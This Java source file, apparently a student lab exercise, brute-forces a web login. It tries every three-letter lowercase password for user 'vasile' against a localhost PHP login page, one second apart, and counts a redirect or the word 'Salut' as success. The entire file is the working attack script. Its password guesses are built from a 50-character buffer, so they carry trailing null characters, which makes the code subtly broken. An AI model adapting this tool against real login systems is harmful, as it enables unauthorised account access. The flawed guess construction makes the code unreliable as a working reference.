
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class BruteForceLogin_vasile
{
	static char password[]=new char[50];
    static String alphabet = "abcdefghijklmnopqrstuvwxyz";
	
	private static boolean tryLogin(String username, String passwordStr) throws IOException 
	{
        URL url = new URL("http://localhost/SISC-AN1-SEM1-SAW/saw_login/login.php");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        // Do not reuse the same connection state across attempts in this demo.
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setInstanceFollowRedirects(false); // we'll inspect redirect manually

        // Set headers commonly used by browsers (optional)
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; TestBot/1.0)");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        // Build form data (adjust field names to match your form)
        String form = "nume_utilizator=" + URLEncoder.encode(username, StandardCharsets.UTF_8.name())
                    + "&parola=" + URLEncoder.encode(passwordStr, StandardCharsets.UTF_8.name())
                    + "&submit=" + URLEncoder.encode("Login", StandardCharsets.UTF_8.name());

        byte[] formBytes = form.getBytes(StandardCharsets.UTF_8);
        conn.setRequestProperty("Content-Length", Integer.toString(formBytes.length));

        // Write POST body
        try (OutputStream os = conn.getOutputStream()) {
            os.write(formBytes);
            os.flush();
        }

        int status = conn.getResponseCode();
        if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM
                || status == HttpURLConnection.HTTP_SEE_OTHER) 
        {
            String loc = conn.getHeaderField("Location");
            System.out.println("Got redirect to: " + loc + " (assuming success)");
            conn.disconnect();
            return true;
        }

        // Otherwise read the response body and look for a success indicator
        InputStream is = (status >= 200 && status < 400) ? conn.getInputStream() : conn.getErrorStream();
        if (is == null) 
        {
            conn.disconnect();
            return false;
        }

        String body;
        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) 
        {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) 
            {
                sb.append(line).append('\n');
            }
            body = sb.toString();
            //System.out.println(body);
        }

        conn.disconnect();

        if(body.contains("Salut")) 
        {
            return true;
        }

        // Otherwise failed login
        return false;
    }
	
	private static void back(int k,int n)
	{
		if(k<n)
		{
			// de scris cod backtracking
            for (int i = 0; i < alphabet.length(); i++) {
                password[k] = alphabet.charAt(i); // Punem litera în buffer
                back(k + 1, n);                   // Trecem la următoarea poziție
            }
		}
		else 
		{
			String guess=new String(password);
			System.out.println(guess);
			boolean ok;
            try 
            {
                ok = tryLogin("vasile",guess);
            } 
            catch (IOException e) 
            {
                System.err.println("I/O error on attempt: " + e.getMessage());
                ok = false;
            }

            if(ok) 
            {
                System.out.println("Found password: " + guess);
                System.exit(0);
            }

            try 
            {
				Thread.sleep(1000);
			} 
            catch (InterruptedException e) 
            {
				e.printStackTrace();
			}			
		}
	}
	
	public static void main(String[] args) 
	{		
		back(0,3);
	}
}